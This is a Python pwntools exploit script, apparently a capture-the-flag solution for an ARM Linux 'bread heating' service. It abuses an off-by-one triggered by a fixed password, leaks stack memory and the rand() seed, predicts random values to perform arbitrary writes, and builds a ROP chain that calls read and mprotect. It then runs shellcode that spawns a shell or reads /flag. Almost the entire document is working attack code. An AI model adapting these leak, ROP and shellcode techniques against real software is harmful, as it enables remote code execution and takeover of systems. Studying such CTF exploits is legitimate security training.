from pwn import *

import re

from collections import defaultdict

from ctypes import CDLL

context.update(arch='arm', os='linux', endian='little')
libc = CDLL('libc.so.6')

memre = re.compile(r'\[\s*([0-9]*)\]')

# password = "How Large Is A Stack Of Toast?\n\x00"  # trigger off-by-one
password = "How Large Is A Stack Of Toast?\n"  # trigger off-by-one


def rand():
    rnd = libc.rand() & 0xff
    return rnd


def heat_bread(r, sl):

    memcontent = []
    overheat = False

    # print "Heating on slice %d (%x)" % (sl, stoa(sl))

    res = r.recvuntil(["Quitting\n", "heat?\n"])

    if "Quitting" in res:
        print "overheated too much"
        return ([], True)

    r.send('{0:03d}'.format(sl)+"\x00")

    res = r.recvuntil("Which")

    if "status" in res:
        memcontent = [int(x) for x in memre.findall(res)]
    if 'overheat' in res:
        overheat = True

    return (memcontent, overheat)


def burn_slice(r, sl):
    o = False
    i = 0
    while(not o):
        (m, o) = heat_bread(r, sl)
        i += 1
    return m, i


def split_by_n(seq, n):
    """A generator to divide a sequence into chunks of n units."""
    while seq:
        yield seq[:n]
        seq = seq[n:]


def memdump(m):
    # return map(u32, split_by_n("".join([chr(m) for m in m]), 4))
    return [u32(x) for x in split_by_n("".join([chr(m) for m in m]), 4)]


def memrepr(m):
    return map(hex, memdump(m))


START = -(0x24 + 8 + 0x10 + 4)
SHOW = START
PSLICES = START-+4
FREE = START-28+3


def enable_show_content():
    heat_bread(r, SHOW)  # show me memory content plz


def awrite(r, sl, seq=[]):
    if sl + len(seq) > 255:
        raise Exception("out of slices bounds!")

    m = []
    d = defaultdict(list)

    for i, s in enumerate(seq):
        if s != "\x00":
            d[s].append(i)

    while sum(map(len, d.values())) > 0:
        rnd = chr(rand())
        if d[rnd]:
            m, o = heat_bread(r, sl+d[rnd].pop())
            print "+",
        else:
            # discard the byte we use the byte containing the slice
            # number which gets always overwritten with \x00
            m, o = heat_bread(r, FREE)
            print '.',
    return m


def stage1(slices_ptr):

    PROT_READ = 1
    PROT_WRITE = 2
    PROT_EXEC = 4
    prot = PROT_EXEC | PROT_READ | PROT_WRITE

    print "will read at %x" % slices_ptr

    # read the stage2 in memory
    rop = p32(0x00021c94+1)         # pop {r0, r1, r2, r3, pc}
    rop += p32(0)                   # stdin
    rop += p32(slices_ptr+16*4)     # buf // free space
    rop += p32(0x100)               # count
    rop += p32(0x00011730)          # read
    rop += p32(0x0000890C+1)        # blx r3 ; pop {r3, pc}
    rop += p32(0)                   # r3 <= fill

    # mprotect the stack
    rop += p32(0x00021c94+1)        # pop {r0, r1, r2, r3, pc}
    rop += p32(slices_ptr)          # addr
    rop += p32(0x100)               # len
    rop += p32(prot)                # prot
    rop += p32(0x00011FB0)          # mprotect
    rop += p32(0x0000890C+1)        # blx r3 ; pop {r3, pc}

    rop += p32(0x00008C92+1)        # r3 <= fill

    rop += p32(slices_ptr+16*4)     # jump out stage2

    # a debug write to dump the content of the stack
    # rop += p32(0x00021c94+1)   # pop {r0, r1, r2, r3, pc}
    # rop += p32(1)             # stdout
    # rop += p32(slices_ptr & 0xfffff000)    # buf
    # rop += p32(0x1000)         # count
    # rop += p32(0x0002C3F0)    # write
    # rop += p32(0x0000890C+1)  # blx r3 ; pop {r3, pc}
    # rop += p32(slices_ptr)
    # rop += p32(0x00008C92+1)  # jump out

    return rop

stage2 = asm("""
    @ r3 contains the address of the exit in main
    @ you can use it for a quick test/clean exit
    @ blx r3

""")

stage2 = asm(pwnlib.shellcraft.arm.linux.sh())

# or read the flag directly
stage2 = asm("""
    mov r1, #(O_RDONLY)
    adr r0, file
    svc SYS_open
    adr r1, file
    mov r2, #20
    svc SYS_read

    mov r2, r0
    mov r0, #1
    svc SYS_write
    svc SYS_exit
    file: .byte 0x2f, 0x66, 0x6c, 0x61, 0x67, 0, 0, 0
""")


def exploit(r):
    global FREE

    # start = space reserved for handle_bread
    # + pushed regs + space until slices + the 4 bytes to go back

    r.recvuntil(" : ")
    r.send(password)
    r.recv()
    # r.send(p32(0x9e945f4d))

    enable_show_content()

    # here we "burn" the lowest addr of slices_addr
    m, n = burn_slice(r, -60)

    # leak interesting addresses
    d = memdump(m)
    # print memrepr(m)
    ret_addr = d.index(0x8c93)
    slices_ptr = d[ret_addr-1]  # leak the address of slices

    seed = d[ret_addr + 3]
    print "Seed leaked 0x%x" % seed
    ret_addr *= 4  # get the return address as slice #

    START = ret_addr
    FREE = START-28+3
    SLICES = slices_ptr+PSLICES*4

    libc.srand(seed)
    [hex(rand()) for x in range(0, n+1)]

    while rand() & 0x80 == 0:  # set i to a negative value
        m, o = heat_bread(r, FREE)
    heat_bread(r, START-16+3)

    # clear return address
    k1 = burn_slice(r, START)[1]
    m, k2 = burn_slice(r, START+1)
    [hex(rand()) for x in range(0, k1+k2)]

    st1 = stage1(SLICES)
    m = awrite(
        r, START,
        p32(0x00009632+1) +  # pop {r4, r5, r6, pc}
        p32(0)*3 +           # with 0s we just skip a few bytes
        st1)
    # test p32(0x00008C92+1)

    print memrepr(m)
    r.sendline("q")  # trigger exit

    r.sendline(stage2)

    r.interactive()


if __name__ == "__main__":

    while(1):
        with remote("localhost", 4000) as r:
            try:
                res = exploit(r)
            except ValueError as e:
                continue
            break
